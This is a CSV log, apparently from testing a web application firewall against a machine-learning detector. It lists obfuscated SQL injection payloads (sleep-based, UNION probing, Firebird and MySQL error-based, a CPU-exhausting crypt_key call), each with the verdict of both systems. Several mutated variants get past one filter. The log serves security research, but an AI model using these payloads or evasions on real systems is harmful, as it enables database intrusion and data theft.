Timestamp,Payload,WAF_Prediction_Timestamp,WAF_Prediction,ML_Prediction_Timestamp,ML_Prediction
2024-09-04T10:21:08.178167,"0x1%"""")))/*r=N*/ANd	(SElect * FROM (seLect(sleep((Select (SeLEct/**/'YN'!='YNJ' not like  AND 0x1)/*rm*/In	(/*o*/ aNd  'ZB' liKE 'ZB',(sElECT (SELECT 177) LIke 177), OR  oR (SelEct 0) LikE (SelecT 1))))))gcrr)#H&'	AND 0x1' not like '0x4*'{Mv",2024-09-04T10:21:08.182233,403,2024-09-04T10:21:18.028268,Accepted
2024-09-04T10:21:19.057259,"0x1%"""")))/**/aND (sELeCT */**/FrOm (SElEct(sleep((seleCT (seleCt/**/'YN'!='YNJ' not like  and 0x1)/*rm*/IN	(/*o*/ AnD  'ZB' likE 'ZB',(SELeCt (SEleCt 177) LIkE 177), Or  OR (SElect 0) liKE (selECt  OR 0x218a=8586))))))gcrr)#H&'	AND 0x1' not like '0x4*'{Mv,f",2024-09-04T10:21:19.061821,403,2024-09-04T10:21:29.118581,Accepted
2024-09-04T10:21:30.142094,"0x1%"""")))/**/anD (SeLeCt */**/frOm (SEleCT(sleep((selecT (selEct/**/'YN'!='YNJ' not like/**/ And 0x1)/*rm*/iN	(/*U]<	N*/ aNd  'ZB' Like 'ZB',(SElEct (SeLECt (SeleCT 177)) lIke  ANd '""x' LIKE '""x'), OR  || (SElECT 0) Like (seLECt  or 0x218a=8586))))))gcrr)#H&' AND 0x1' not like '0x4*'{Mv,f",2024-09-04T10:21:30.146522,403,2024-09-04T10:21:42.519407,Rejected
2024-09-04T10:21:43.530118,"1') union all select null,null,null,null,null,null,null#",2024-09-04T10:21:43.535066,403,2024-09-04T10:21:46.215344,Rejected
2024-09-04T10:21:46.225940,"(sElEct/**/5425 not like  AND 1)')
union all seLEcT null,null,null,null,null,null,null#",2024-09-04T10:21:46.229414,403,2024-09-04T10:21:49.845790,Rejected
2024-09-04T10:21:50.866417,"(SEleCt 5425	not like  ANd 0x27b NOT LIKE  AND 1)')
union all sELeCt null,null,null,null,null,null,null#d",2024-09-04T10:21:50.871633,403,2024-09-04T10:21:55.225559,Rejected
2024-09-04T10:21:56.242622,"(select (select '8m'/**/NOT LIKE '8m&')	not like  AND 0x27b not like  anD (SelECT 1))')	union all sElect null,null,null,null,null,null,null#dH",2024-09-04T10:21:56.245710,403,2024-09-04T10:22:01.981080,Rejected
2024-09-04T10:22:03.006965,"(selECT (SelECT '8m'/**/NOT LIKE '8m&')	not like  && 0x27b not like  anD (seLeCt 0x1))') union/**/all seleCt null,null,null,null,null,null,null#dH",2024-09-04T10:22:03.012253,403,2024-09-04T10:22:09.324734,Rejected
2024-09-04T10:22:10.352865,"(seLecT (SeLect '8m'/*A*/NOT LIKE '8m&')	not
like   AND  0x27b not like  AnD (SEleCt 0x1))') union all SelECT null,null,null,null,null,null,null#dH",2024-09-04T10:22:10.359542,403,2024-09-04T10:22:16.438404,Rejected
2024-09-04T10:22:17.466220,"(SeLeCT (selEct '8m'/*A*/NOT LIKE '8m&')	not like   aND  0x27b not like /**/and (sELECt 0x1))') union all SeleCT null,null,null,null,null,null,null#dH<",2024-09-04T10:22:17.470517,403,2024-09-04T10:22:23.713548,Rejected
2024-09-04T10:22:24.729850,"(seLECT (SEleCT '8m' NOT LIKE '8m&')	not like	  and  0x27b not like /**/&& (sELeCT 0x1))') union all SELEcT null,null,null,null,null,null,null#dH< OR '@\'' NOT LIKE '@\'P'",2024-09-04T10:22:24.737414,403,2024-09-04T10:22:31.992612,Rejected
2024-09-04T10:22:33.019644,"(sEleCT (SeLeCT '8m' NOT LIKE '8m&')	not like	  And  0x27b not like  && (SElect 0x1))') union all SELEcT null,null,null,null,null,null,null#dH< OR '@\'' not like
'@\'P'",2024-09-04T10:22:33.024430,403,2024-09-04T10:22:39.861816,Rejected
2024-09-04T10:22:40.886589,"(SeleCt (seLeCT '8m' not like '8m&')	not like	  aNd  0x27b not like  && (sELecT 0x1))') union all SELEcT null,null,null,null,null,null,null#dH< OR/**/'@\'' not like	'@\'P'|'5ts'='5ts'",2024-09-04T10:22:40.890730,403,2024-09-04T10:22:48.337755,Rejected
2024-09-04T10:22:49.360146,"(SeLeCt (sELecT
'8m' not like '8m&')	not like	  and /**/0x27b not like  && (sEleCT 0x1))') union all SELEcT null,null,null,null,null,null,null#dH< OR/*wfJ*/'@\'' not like	'@\'P'|'5ts' LiKe '5ts'",2024-09-04T10:22:49.364712,403,2024-09-04T10:22:57.507563,Rejected
2024-09-04T10:22:58.521007,46208410f,2024-09-04T10:22:58.531991,200,2024-09-04T10:22:58.989728,Accepted
2024-09-04T10:22:58.996049,46208410f,2024-09-04T10:22:59.000692,200,2024-09-04T10:22:59.493918,Accepted
2024-09-04T10:23:00.508104,46208410f,2024-09-04T10:23:00.515730,200,2024-09-04T10:23:00.950607,Accepted
2024-09-04T10:23:01.959891,46208410f,2024-09-04T10:23:01.964407,200,2024-09-04T10:23:02.427286,Accepted
2024-09-04T10:23:03.440640,46208410f,2024-09-04T10:23:03.449396,200,2024-09-04T10:23:03.893767,Accepted
2024-09-04T10:23:04.908372,46208410f,2024-09-04T10:23:04.913090,200,2024-09-04T10:23:05.349873,Accepted
2024-09-04T10:23:06.364077,46208410f,2024-09-04T10:23:06.373147,200,2024-09-04T10:23:06.805020,Accepted
2024-09-04T10:23:07.819242,46208410f,2024-09-04T10:23:07.829379,200,2024-09-04T10:23:08.265335,Accepted
2024-09-04T10:23:09.273678,46208410f,2024-09-04T10:23:09.277728,200,2024-09-04T10:23:09.753101,Accepted
2024-09-04T10:23:10.765752,46208410f,2024-09-04T10:23:10.770713,200,2024-09-04T10:23:11.237917,Accepted
2024-09-04T10:23:12.253571,46208410f,2024-09-04T10:23:12.261569,200,2024-09-04T10:23:12.694632,Accepted
2024-09-04T10:23:13.704263,1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt,2024-09-04T10:23:13.709356,403,2024-09-04T10:23:18.540951,Rejected
2024-09-04T10:23:18.548051,"1'/**/and (SELECT 6734 NOT LIKE 6735)=('qqpjq'||(select case 6240 when  AND 1 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt'
like 'sqvt",2024-09-04T10:23:18.552405,403,2024-09-04T10:23:25.189410,Rejected
2024-09-04T10:23:26.199928,1'/**/and (SELECT 6734 NOT LIKE 6735)=('qqpjq'||(select case 6240 when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then 1 else 0 end from rdb$database)||'qzvzq')/**/and 'sqvt'	like 'sqvt,2024-09-04T10:23:26.203294,403,2024-09-04T10:23:33.768085,Rejected
2024-09-04T10:23:34.785055,"&& 1'/**/and (SELECT 6734 NOT LIKE 6735)=('qqpjq'||(select case 6240 when  AND/*~-*/(SELECT (SELECT 'oqY~n'!='oqY~nl')) then
0x1 else 'j'='j' end from rdb$database)||'qzvzq')/**/and 'sqvt'	like 'sqvt",2024-09-04T10:23:34.790262,403,2024-09-04T10:23:43.467248,Rejected
2024-09-04T10:23:44.487313,and  1' and (SELECT (SELECT 6734) NOT LIKE 7514 NOT LIKE 7515)=('qqpjq'||(select case  OR 0 when  AND/*~-*/(SELECT (SELECT 'oqY~n'!='oqY~nl')) then	0x1 else 'j'='j' end from rdb$database)||'qzvzq')/**/and 'sqvt'	like 'sqvt,2024-09-04T10:23:44.491926,403,2024-09-04T10:23:55.275592,Rejected
2024-09-04T10:23:56.297401,And   OR 0 liKe 5537' and (SELECT (SELECT 6734) NOT LIKE 7514 NOT/**/LIKE	0x1d5b)=('qqpjq'||(select case  OR 0 when  AND/**/(SELECT (SELECT 'oqY~n'!='oqY~nl')) then	0x1 else 'j'='j' end from rdb$database)||'qzvzq')/**/and 'sqvt'	like 'sqvt,2024-09-04T10:23:56.303007,403,2024-09-04T10:24:07.543679,Rejected
2024-09-04T10:24:08.566533,aND   or 0 LIke 5537' and (SELECT (SELECT 6734) NOT LIKE (SELECT 1) NOT/**/LIKE	0x1d5b)=('qqpjq'||(select case  OR (SELECT	5212) LIKE 5212 when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then	0x1 else 'j'='j' end from rdb$database)||'qzvzq')/**/and 'sqvt'	like 'sqvt,2024-09-04T10:24:08.571616,403,2024-09-04T10:24:19.721493,Rejected
2024-09-04T10:24:20.745609,"anD   Or (sELect 0) liKE ',' not like ',5'' and (SELECT (SELECT (SELECT 1)) NOT	LIKE (SELECT 1) NOT/* i)*/LIKE	0x1d5b)=('qqpjq'||(select case  OR (SELECT	5212) LIKE 5212 when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then	0x1 else 'j'='j' end from rdb$database)||'qzvzq') and 'sqvt'	like 'sqvt",2024-09-04T10:24:20.751789,403,2024-09-04T10:24:32.484523,Rejected
2024-09-04T10:24:33.498655,"anD   or (SelECt '<' NOT LIKE '<|') LIke ',' not like ',5'' and (SELECT (SELECT (SELECT 1)) NOT	LIKE (SELECT 1) NOT/* i)*/LIKE	0x1d5b)=('qqpjq'||(select case  OR (SELECT	5212) LIKE  OR (SELECT 0) when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then 0x1 else 'j'='j' end from rdb$database)||'qzvzq') and/**/'sqvt'	like 'sqvt",2024-09-04T10:24:33.503981,403,2024-09-04T10:24:47.299601,Rejected
2024-09-04T10:24:48.326340,"and   oR (SELect '<' not like '<|')
liKE ',' not like ',5'' and (SELECT (SELECT (SELECT 0x1)) NOT	LIKE (SELECT 1) NOT/* i)*/LIKE	0x1d5b)=('qqpjq'||(select case  OR (SELECT	5212) LIKE  OR (SELECT (SELECT 1)=6804) when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then 0x1 else 'j'='j' end from rdb$database)||'qzvzq') and 'sqvt'	like 'sqvt",2024-09-04T10:24:48.330708,403,2024-09-04T10:25:02.361683,Rejected
2024-09-04T10:25:03.391131,"aND   oR (seLect '<' not like '<|')
like ',' not like ', OR 0'' and/*!aMW*/(SELECT (SELECT (SELECT 0x1)) NOT	LIKE (SELECT (SELECT 1)) NOT/* i)*/LIKE	0x1d5b)=('qqpjq'||(select case  OR (SELECT
7626 NOT LIKE 7627) LIKE  OR (SELECT (SELECT 1)=6804) when  AND (SELECT (SELECT 'oqY~n'!='oqY~nl')) then 0x1 else 'j'='j' end from rdb$database)||'qzvzq') and 'sqvt'	like 'sqvt",2024-09-04T10:25:03.395293,403,2024-09-04T10:25:18.604577,Rejected
2024-09-04T10:25:19.615409,"-1269"""" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",2024-09-04T10:25:19.621437,403,2024-09-04T10:25:22.741711,Rejected
2024-09-04T10:25:22.752161,"-1269""""/**/union
all SElEcT 8412,8412,8412,''`' LIKE ''`',8412,8412,(SELEcT 8412), OR 0--",2024-09-04T10:25:22.755391,403,2024-09-04T10:25:26.533544,Rejected
2024-09-04T10:25:27.559232,"-0x4f5"""" union
all	SELECT 8412,8412,8412,''`' LIKE ''`',8412,'s@%W^'!='s@%W^e',(SeLeCT (seLect 1)), or 0--",2024-09-04T10:25:27.564231,403,2024-09-04T10:25:31.950623,Rejected
2024-09-04T10:25:32.976755,"-0x4f5"""" union
all
SElect 8412,8412,(sElEcT/**/8412),''`' LIKE ''`',5013=5013,'s@%W^'!='s@%W^e',(SEleCt (SElEct (SELECT 1))), Or 0--",2024-09-04T10:25:32.981599,403,2024-09-04T10:25:38.469000,Rejected
2024-09-04T10:25:39.496264,"-0x4f5""""	union
all
SelECt 8412,8412,(SElECT 8412),''`' LIKE ''`',''' not like ''-'=5013,'s@%W^'!='s@%W^e',(SElEct (selECt (SeLeCT (SeLeCt 1)))), Or (SELECT 0)--",2024-09-04T10:25:39.500341,403,2024-09-04T10:25:46.520737,Rejected
2024-09-04T10:25:47.539881,"-0x4f5"""" union
all
SElECT (sELEcT 1),2703 LIKE 2703,(sElEct/**/8412),''`' LIKE ''`',''' not like ''-'=0x1395,'s@%W^'!='s@%W^e',(selEct (SElect (SelEct (sElECt 1)))), or (selEcT 0)--",2024-09-04T10:25:47.543780,403,2024-09-04T10:25:54.860974,Rejected
2024-09-04T10:25:55.877062,"-0x4f5"""" union
all
selecT/**/(seLECT  and 1),2703 lIKE 4693!=4694,(SeLecT/*$u*/(sELEct 8412)),''`' LIKE ''`',''' not like ''-'=0x1395,'s@%W^'!='s@%W^e',(sElECt (sElecT	(sELEct (selecT 1)))), OR (seLect 0)--",2024-09-04T10:25:55.881566,403,2024-09-04T10:26:04.721357,Rejected
2024-09-04T10:26:05.744908,"-0x4f5"""" union
all
seLect/*(""PX*/(sElEcT  And '`' LIKE '`'),2703 LIke 4693!=0x1256,(SeLeCt/*$u*/(seLect 8412)),''`' LIKE	''`',''' not like ''-'=0x1395,'s@%W^'!='s@%W^e',(SeLecT (seLEcT	(sELeCt (SELect  aND 1)))),/**/Or (SeLeCT 0)--",2024-09-04T10:26:05.750610,403,2024-09-04T10:26:16.168173,Rejected
2024-09-04T10:26:17.207065,"-0x4f5"""" union
all
sELecT/*(""PX*/(SeLEct  And '`' lIkE '`'),2703 Like  ANd 0x1!=0x1256,(SElECT/*JuVu^*/(seLECT 8412)),''`' LIKE	''`',''' not like	''-'=0x1395,'s@%W^'!='s@%W^e',(SeLEct (sELEcT	(seleCt (SELECt  And 1)))), OR (SeleCt 5928!=5929)--",2024-09-04T10:26:17.215359,403,2024-09-04T10:26:27.489085,Accepted
2024-09-04T10:26:28.524491,"-0x4f5"""" union
all	seLEct/*(""PX*/(sElEcT  AnD '`' lIkE '`'),2703 LIke  aNd 0x1<>0x1256,(SeLECT (Select 8412)),''`' LIKE	''`',''' not like	''-'=0x1395,'s@%W^'!='s@%W^e',(SeLecT (SeLeCt	(SelecT (Select  aND 1)))), or (SELeCT (sEleCt (seleCt 1))!='j'<>'jg')--",2024-09-04T10:26:28.528891,403,2024-09-04T10:26:39.307073,Accepted
2024-09-04T10:26:40.334079,"-0x4f5"""" union
all	SeLeCT/*(""PX*/(SeLEcT  anD '`' like '`'),'d'<>'dS' Like  AND 0x1 not
like 0x1256,(SeleCT (sELECt  AND 1)),''`' LIKE	''`',''' not like	''-'=0x1395,'s@%W^'!='s@%W^e',(SeLecT (SeLeCt	(SelecT (Select /**/aND 1)))), or (SELeCT (sEleCt (seleCt (SELECT 1)))!='j'<>'jg')--",2024-09-04T10:26:40.339398,403,2024-09-04T10:26:52.248814,Rejected
2024-09-04T10:26:53.261964,"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",2024-09-04T10:26:53.273003,403,2024-09-04T10:26:57.509098,Rejected
2024-09-04T10:26:57.522965,"(SELECT 1);call/*#*/regexp_substring(repeat(leFt(crypt_key(char(65) OR char(69)||char(83),null),(SELECT 8743)
NOT LIKE 8744),500000000),null)--",2024-09-04T10:26:57.529260,403,2024-09-04T10:27:03.464837,Rejected
2024-09-04T10:27:04.490808,"(SeLECt 1);call regexp_substring(repeat(LeFT(crypt_key(char((SELECT	65)) oR char(69)||char(83),null),(SeLEcT (SELECT 1))
not like 8744),'>'!='>9'),null)--",2024-09-04T10:27:04.496625,403,2024-09-04T10:27:10.704034,Rejected
2024-09-04T10:27:11.735314,"(selecT 1);call regexp_substring(repeat(lEFt(crypt_key(char((SeLect
65)) or/**/char(69)||char( or 'PF' NOT LIKE 'PF%'),null),(sElEcT (sELEcT 0x1))
not like 8744),'>' not like '>9'),null)--",2024-09-04T10:27:11.739067,403,2024-09-04T10:27:19.677697,Rejected
2024-09-04T10:27:20.703729,"(SELEct 1);call regexp_substring(repeat(LEft(crypt_key(char((sELecT
(SeleCt 1))) Or/*d)*/char(0x45) Or char( or 'PF' NOT LIKE 'PF%'),null),(SelEcT (sELECt 0x1))
not/**/like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:27:20.708231,403,2024-09-04T10:27:29.250196,Rejected
2024-09-04T10:27:30.283382,"(seLeCT	(SELECT 1));call regexp_substring(repeat(LEFT(crypt_key(char((sElecT
(seLEct 4099 IN ( OR 0,4099,4100)))) OR/*d)*/char(0x45) Or char( oR 'PF' not like 'PF%'),null),(SEleCT (SelecT 0x1))
not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:27:30.288517,403,2024-09-04T10:27:40.439355,Rejected
2024-09-04T10:27:41.480201,"(SelEcT	(selECt 1));call regexp_substring(repeat(lEft(crypt_key(char((sEleCt
(SELeCt 4099 in ( oR 0, OR 8263 LIKE 8263,(SELECT 4100))))) oR/*d)*/char(0x45) || char( oR 'PF' not/**/like 'PF%'),null),(SelEct (SeleCT 0x1))	not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:27:41.485654,403,2024-09-04T10:27:52.552221,Rejected
2024-09-04T10:27:53.579340,"(SeLEcT	(SelEct (sEleCt 2166!=2167)));call regexp_substring(repeat(LEFt(crypt_key(char((Select	(sElECT/**/4099 in ( OR 0, OR 8263 LIkE (sELeCt 8263),(SELecT 4100))))) OR/*d)*/char(0x45)  OR  char( oR 'PF' not/**/LIkE 'PF%'),null),(seLECt (sELeCT 0x1))	not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:27:53.583902,403,2024-09-04T10:28:06.157493,Rejected
2024-09-04T10:28:07.191076,"(sELECT	(seLECT (sELECT 2166<>1437 LIKE 1437)));call
regexp_substring(repeat(leFt(crypt_key(char((seLeCT	(selECt/**/(SELECT 4099) In (/**/oR  OR 0, oR 8263 lIKe (SElEcT 8263),(sEleCT 4100))))) OR/*d)*/char(0x45)  Or  char( oR 'PF' not/*[:?D(*/Like 'PF%'),null),(SElect (seLECt 0x1))	not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:28:07.196051,403,2024-09-04T10:28:21.046545,Rejected
2024-09-04T10:28:22.066935,"(sElEcT	(seLeCt (Select 2166<>1437 Like 1437)));call regexp_substring(repeat(LEFT(crypt_key(char((sEleCt	(seLEct/**/(SELEcT 4099) In (/*Tjb&*/or  Or 4267 NOT LIKE 4268, oR /**/and 1 likE (SeLECT 8263),(sEleCT 0x1004))))) oR/*d)*/char(0x45)  or  char( Or 'PF' not/*[:?D(*/lIke 'PF%'),null),(SELEct (seLect 0x1))	not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:28:22.071281,403,2024-09-04T10:28:36.906337,Rejected
2024-09-04T10:28:37.948036,"(SELEcT	(sElEct (seleCT 2166!=1437 lIKe 1437)));call regexp_substring(repeat(left(crypt_key(char((SeLECt	(sElEcT (SElEcT 4268!=4269) In (/*Tjb&*/Or  or 4267 NOT LIKE (sEleCT  ANd 1), oR /**/AND 1 lIke (sElECt 8263),(SeLEct 0x1004))))) Or/*d)*/char(0x45)  or  char( oR 'PF' not/*[:?D(*/lIke
'PF%'),null),(SeLEcT (sElecT 0x1))	not like 'Is'<>'Isj'),'>'	not like '>9'),null)--",2024-09-04T10:28:37.952090,403,2024-09-04T10:28:53.423926,Rejected
2024-09-04T10:28:54.435452,1'))) and 7533=7533 and ((('suzd' like 'suzd,2024-09-04T10:28:54.440551,403,2024-09-04T10:28:56.311358,Rejected
2024-09-04T10:28:56.322482,1109 not like  aNd 1'))) and 0x1d6d=7533 and	((('suzd' like/**/'suzd,2024-09-04T10:28:56.326531,403,2024-09-04T10:28:59.262128,Rejected
2024-09-04T10:29:00.274400,"1109 not like  aNd 1'))) and 0x1d6d=0x1361	IN (4960, OR 0,4962) and	((('suzd' like 'suzd",2024-09-04T10:29:00.278437,403,2024-09-04T10:29:04.249298,Rejected
2024-09-04T10:29:05.266145,"1109 not like 	AND 'M@'!='M@/''))) and 0x1d6d=0x1361	IN (4960, OR 0x0,(SELECT/**/1)) and	((('suzd' like 'suzd",2024-09-04T10:29:05.275697,200,2024-09-04T10:29:09.666649,Rejected
2024-09-04T10:29:10.684987,"'' not like ''' not like 	anD	'M@'!='M@/''))) and 0x1d6d=0x1361	IN (4960, OR 0x0,(SELECT  OR (SELECT 0))) and	((('suzd' like 'suzd",2024-09-04T10:29:10.691033,200,2024-09-04T10:29:15.997277,Rejected
2024-09-04T10:29:17.024155,"'' not like ''' not like 	anD	'M@'!='M@/''))) anD 0x1d6d=0x1361	IN ((SeLEct ''=''), oR 0x0,(SElect  || (SeLECT 0x0))) ANd ((('suzd'/**/like 'suzd",2024-09-04T10:29:17.028286,403,2024-09-04T10:29:23.095332,Rejected
2024-09-04T10:29:24.112675,"'' not like ''' not like 	anD	'M@'!='M@/''))) ANd 0x1d6d=0x1361	iN ((sEleCt
''=''), Or 0x0,(selEcT   OR  (SeLeCT 0x0))) anD ((('suzd' LIKe 'suzd",2024-09-04T10:29:24.116866,200,2024-09-04T10:29:30.604646,Rejected
2024-09-04T10:29:31.622294,"'' not like ''' not like  anD	'M@'!='M@/''))) and 0x1d6d=0x1361	in ((seLeCt
'' LIKE ''), OR 0x0,(sEleCT   or  (SElecT/**/0x0))) aND ((('suzd' LikE 'suzd",2024-09-04T10:29:31.627975,200,2024-09-04T10:29:38.130438,Rejected
2024-09-04T10:29:39.155964,"'' not like ''' not like  anD	'M@'!='M@/''))) AnD 0x1d6d LIKE 0x1361	IN ((selecT '' liKe ''), oR 0x0,(SELEct   oR  (selEct 0x0))) AND ((('suzd' liKE 'suzd",2024-09-04T10:29:39.162402,200,2024-09-04T10:29:45.607486,Rejected
2024-09-04T10:29:46.638027,"'' not like ''' not like  anD	'M@'!='M@/''))) ANd 0x1d6d lIKe 0x1361	In ((SELeCT '' Like ''),	OR 0x0,(seleCT  /**/Or  (sELECt 0x0))) aNd ((('suzd' LiKe 'suzd",2024-09-04T10:29:46.643299,200,2024-09-04T10:29:54.724012,Rejected
2024-09-04T10:29:55.749052,"'' not like ''' not like  anD	'M@'!='M@/''))) And 0x1d6d like 0x1361	In
((SeLEct '' lIke ''),	or 0x0,(SElecT  /*6o*/or /**/(seLECt 0x0))) And ((('suzd' lIke 'suzd",2024-09-04T10:29:55.755087,403,2024-09-04T10:30:03.560865,Accepted
2024-09-04T10:30:04.572987,"1"""" where 9829=9829 order by 1#",2024-09-04T10:30:04.580214,200,2024-09-04T10:30:05.950486,Rejected
2024-09-04T10:30:05.960863,"1"""" WherE
9829 lIKe/**/(sElEcT 1) In (5611,5612,(SELECT 5613)) order by 1#n[",2024-09-04T10:30:05.965306,200,2024-09-04T10:30:09.604345,Rejected
2024-09-04T10:30:10.627316,"1"""" WHerE
'd' NOT LIKE 'd@' LiKe (sELEcT (sELEct 1))
iN (5611,5612,(selecT 5613)) order by  || 0#n[:",2024-09-04T10:30:10.632875,200,2024-09-04T10:30:15.533122,Rejected
2024-09-04T10:30:16.558047,"0x1da3<>7588""""/*y>*/wherE
'd' not like 'd@' LIKE (SElECt (SELECt (selEct 1)))	iN (5611,5612,(SeLECt 5613)) order by  || 0#n[:",2024-09-04T10:30:16.564036,200,2024-09-04T10:30:22.368772,Rejected
2024-09-04T10:30:23.394477,"0x1da3<>7588""""/*P3/*/wheRe
'd'/**/not like 'd@' LiKE (SElEcT (SeLecT (SElEcT	1)))	iN (5611,(sELect  or 0),(sElECt 5613)) order by  || 'p'!='pv'#n[:",2024-09-04T10:30:23.398773,403,2024-09-04T10:30:30.235642,Accepted
2024-09-04T10:30:31.258411,"0x1da3<> OR (SELECT 0)""""/*P3/*/WheRE	'd'/**/not like 'd@' LiKE (SeLecT (SelEcT (sELecT	1)))	in (5611,(seLecT  Or 0),(selECt ''=''))/**/order by   OR  'p'!='pv'#n[:",2024-09-04T10:30:31.264824,200,2024-09-04T10:30:38.912571,Accepted
2024-09-04T10:30:39.937541,"0x1da3<> or (SELect 'i' like 'i')""""/*P3/*/WHEre	'd'/**/not like 'd@' LIkE (SeLEct (SElect (sElEct	1)))	IN (5611,(SELeCt  Or (SELECT (SELECT 1))),(sELecT ''='')) order by   Or  'p'!='pv'#n[:	A",2024-09-04T10:30:39.942929,200,2024-09-04T10:30:49.260133,Rejected
2024-09-04T10:30:50.286636,"0x1da3<> Or (SElecT 'i' likE 'i')""""/*P3/*/whErE	'd' not like 'd@' LIkE (SelECT (SeLEct (select	(SelECT 1)))) IN (5611,(seLeCT  OR (SElecT (seLEcT  oR 0 not like 433))),(selecT ''='')) order by   or  'p'!='pv'#n[:	A9",2024-09-04T10:30:50.292386,200,2024-09-04T10:31:00.339937,Accepted
2024-09-04T10:31:01.362931,"0x1da3<> Or (sElEcT 'i' like 'i')""""/*P3/*/WHERe	'd' not/**/LiKE 'd@' LIkE (SeLEcT (seLECt (SELEcT	(sELeCT 1)))) in (5611,(sELeCT  or (sElEcT (selecT  Or 279 LiKE 279 not like  || (seLECT 0)))),(sElEcT ''='')) order by   OR  'p'!='pv'#n[:
A9",2024-09-04T10:31:01.367653,403,2024-09-04T10:31:12.051862,Rejected
2024-09-04T10:31:13.070516,"0x1da3<> OR (seLect 'i' lIke 'i')""""/*P3/*/WHere	'd' not/**/LIkE 'd@' liKe (SElect (sELeCT (sElect
(SElEct 1)))) iN (5611,(SEleCT  OR (sEleCT (SelecT  Or  OR (SELECT 9019)<>9020 liKe 279 not like  || (sELect 0)))),(sELeCt '' Like '')) order by /**/ or  'p'!='pv'#n[:
A9d",2024-09-04T10:31:13.076347,403,2024-09-04T10:31:24.618494,Accepted
2024-09-04T10:31:25.651441,"0x1da3<> oR (SeLeCt 'i' like 'i')""""/*P3/*/wheRE	'd' not/**/LIKe 'd@' lIKE (sEleCT (SeLecT (sELEcT
(selECT 1)))) in (5611,(seLect  oR (seLECt (seLEcT  or  or/**/(SELecT (sElecT 9019))<> oR 0 lIke 279 not like  || (seLeCT 'D2' lIKe 'D2')))),(seleCT '' LIKe '')) order by /**/ oR	 'p'<>'pv'#n[:
A9dd",2024-09-04T10:31:25.656637,403,2024-09-04T10:31:38.335127,Accepted
2024-09-04T10:31:39.343922,"1"""" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and """"bkrk""""=""""bkrk",2024-09-04T10:31:39.350095,403,2024-09-04T10:31:47.110531,Rejected
2024-09-04T10:31:47.125554,"1"""" Or (sElEct	(SELECT 9173) fROM(SELECT count(*),concat(0x7171706a71,(seleCT (elt(9173=9173,'T' NOT LIKE 'T}'))),0x717a767a71,floor(rand((sELeCt/**/1))*2))x fRoM information_schema.character_sets group by x)a) aNd """"bkrk"""" Like """"bkrk",2024-09-04T10:31:47.129180,403,2024-09-04T10:31:57.212176,Rejected
2024-09-04T10:31:58.239018,"1"""" oR (seLECt	(SEleCT 9173) from(SElEcT count(*),concat(0x7171706a71,(SELecT (elt(9173 Like 9173,'T'/**/NOT LIKE 'T}'))),0x717a767a71,floor(rand((sELEct/*
*/(selECt 5232 LIKE 5232)))* oR 0))x FroM information_schema.character_sets group by x)a) AND """"bkrk"""" LIke """"bkrk",2024-09-04T10:31:58.244643,403,2024-09-04T10:32:09.160722,Rejected
2024-09-04T10:32:10.181339,"1"""" oR (SELECT
(SeLECt  OR 0) FROM(SELeCT count(*),concat(0x7171706a71,(selECt (elt(0x23d5 liKe 9173,'T' NOT LIKE 'T}'))),0x717a767a71,floor(rand((seLEcT/**/(seLeCT 5232 LikE 5232)))* or 'H'<>'Hy'))x From information_schema.character_sets group by x)a) anD """"bkrk"""" LiKE """"bkrk",2024-09-04T10:32:10.186237,403,2024-09-04T10:32:22.156275,Rejected
